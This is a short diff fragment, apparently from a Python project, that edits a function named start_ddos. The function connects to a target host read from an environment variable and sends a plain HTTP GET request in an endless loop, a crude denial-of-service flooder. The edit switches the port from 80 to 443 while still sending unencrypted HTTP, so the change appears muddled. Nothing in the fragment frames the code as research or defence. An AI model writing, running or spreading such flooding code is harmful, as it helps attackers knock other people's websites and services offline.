@@ -2583,7 +2583,7 @@ def start_web():
   socketio.run(app,host="0.0.0.0",port=5000,allow_unsafe_werkzeug=True)
 def start_ddos():
   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-  s.connect((os.environ.get("url"), 80))
+  s.connect((os.environ.get("url"), 443))
   message = "GET / HTTP/1.1\r\nHost: {}\r\n\r\n".format(os.environ.get("url"))
   while True:
     s.send(message.encode())
